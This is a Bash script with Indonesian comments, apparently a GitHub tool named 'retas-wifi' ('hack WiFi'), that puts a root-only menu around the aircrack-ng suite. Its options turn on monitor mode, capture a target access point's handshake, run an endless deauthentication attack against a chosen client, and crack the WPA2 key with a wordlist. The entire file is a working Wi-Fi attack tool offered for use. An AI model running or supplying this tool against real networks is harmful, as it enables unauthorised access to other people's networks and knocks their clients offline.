#!/bin/bash

if [ "$EUID" -ne 0 ]; then
  echo "Error: script ini harus dijalankan sebagai root."
  exit 1
fi

# Mendapatkan waktu saat ini
current_time=$(date +"%A, %d %B %Y %T")

# Mengonversi hari dalam bahasa Indonesia
case "$(date +"%A")" in
  "Monday") day="Senin" ;;
  "Tuesday") day="Selasa" ;;
  "Wednesday") day="Rabu" ;;
  "Thursday") day="Kamis" ;;
  "Friday") day="Jumat" ;;
  "Saturday") day="Sabtu" ;;
  "Sunday") day="Minggu" ;;
esac

# Mengonversi bulan dalam bahasa Indonesia
case "$(date +"%B")" in
  "January") month="Januari" ;;
  "February") month="Februari" ;;
  "March") month="Maret" ;;
  "April") month="April" ;;
  "May") month="Mei" ;;
  "June") month="Juni" ;;
  "July") month="Juli" ;;
  "August") month="Agustus" ;;
  "September") month="September" ;;
  "October") month="Oktober" ;;
  "November") month="November" ;;
  "December") month="Desember" ;;
esac

# Default interface
interface=""

while getopts "i:-:" opt; do
  case $opt in
    i)
      interface="$OPTARG"
      ;;
    -)
      case "${OPTARG}" in
        interface)
          interface="${!OPTIND}"
          OPTIND=$((OPTIND + 1))
          ;;
        *)
          echo "Invalid option: --${OPTARG}"
          exit 1
          ;;
      esac
      ;;
    \?)
      echo "Invalid option: -$OPTARG"
      exit 1
      ;;
  esac
done

if [ -z "$interface" ]; then
  echo "Error: interface belum ditentukan. Gunakan opsi -i atau --interface."
  exit 1
fi

if ! ip link show "$interface" &>/dev/null; then
  echo "Error: interface '$interface' tidak ditemukan."
  exit 1
fi

while true; do
  clear
  echo "[+] Waktu: $day, $(date +"%d") $month $(date +"%Y"), $(date +"%T") WIB"
  echo "[+] Pembuat Script: Rofi"
  echo "[+] Github: https://github.com/rofidoang03/retas-wifi.git"
  echo ""
  echo "====================================================================="
  echo "                                                                     "
  echo "██████╗ ███████╗████████╗ █████╗ ███████╗    ██╗    ██╗██╗███████╗██╗"
  echo "██╔══██╗██╔════╝╚══██╔══╝██╔══██╗██╔════╝    ██║    ██║██║██╔════╝██║"
  echo "██████╔╝█████╗     ██║   ███████║███████╗    ██║ █╗ ██║██║█████╗  ██║"
  echo "██╔══██╗██╔══╝     ██║   ██╔══██║╚════██║    ██║███╗██║██║██╔══╝  ██║"
  echo "██║  ██║███████╗   ██║   ██║  ██║███████║    ╚███╔███╔╝██║██║     ██║"
  echo "╚═╝  ╚═╝╚══════╝   ╚═╝   ╚═╝  ╚═╝╚══════╝     ╚══╝╚══╝ ╚═╝╚═╝     ╚═╝"
  echo ""                                                                     
  echo "====================================================================="
  echo "         |"
  echo "        [1]--[ Aktifkan Mode Monitor ]"
  echo "         |"
  echo "        [2]--[ Nonaktifkan Mode Monitor ]"
  echo "         |"
  echo "        [3]--[ Tangkap Data Wi-Fi ]"
  echo "         |"
  echo "        [4]--[ Injeksi Paket Wi-Fi ]"
  echo "         |"
  echo "        [5]--[ Retas Kunci Wi-Fi ]"
  echo "         |"
  echo "        [6]--[ Keluar ]"
  echo "         |"
  echo "====================================================================="
  # Meminta input dari pengguna
  read -p "Pilih opsi (1-6): " choice

  case $choice in
    1)
      # Aktifkan Mode Monitor
      airmon-ng start "${interface}"
      read -p "Tekan tombol [Enter] untuk melanjutkan..."
      ;;
    2)
      # Nonaktifkan Mode Monitor
      airmon-ng stop "${interface}"
      read -p "Tekan tombol [Enter] untuk melanjutkan..."
      ;;
    3)
      # Tangkap Data Wi-Fi
      airodump-ng "${interface}"
      read -p "Masukkan MAC Address dari Access Point: " target_bssid
      read -p "Masukkan channel: " channel
      read -p "Masukkan nama file output: " output_file
      airodump-ng --bssid "${target_bssid}" --channel "${channel}" -w "${output_file}" "${interface}"
      read -p "Tekan tombol [Enter] untuk melanjutkan..."
      ;;
    4)
      # Injeksi Paket Wi-Fi
      read -p "Masukkan MAC Address dari Access Point: " ap
      read -p "Masukkan MAC Address dari client:" client
      aireplay-ng -0 0 -a "${ap}" -c "${client}" "${interface}"
      read -p "Tekan tombol [Enter] untuk melanjutkan..."
      ;;
    5)
      # Retas Kunci Wi-Fi
      read -p "Masukkan nama file handshake: " file_handshake
      read -p "Masukkan file wordlist: " file_wordlist
      aircrack-ng -a2 -w "${file_wordlist}" "$file_handshake"
      read -p "Tekan tombol [Enter] untuk melanjutkan..."
      ;;
    6)
      # Keluar
      echo "Terima kasih! Keluar dari program."
      exit 0
      ;;
    *)
      # Pilihan tidak valid
      echo "Pilihan tidak valid. Silakan pilih kembali."
      ;;
  esac
done
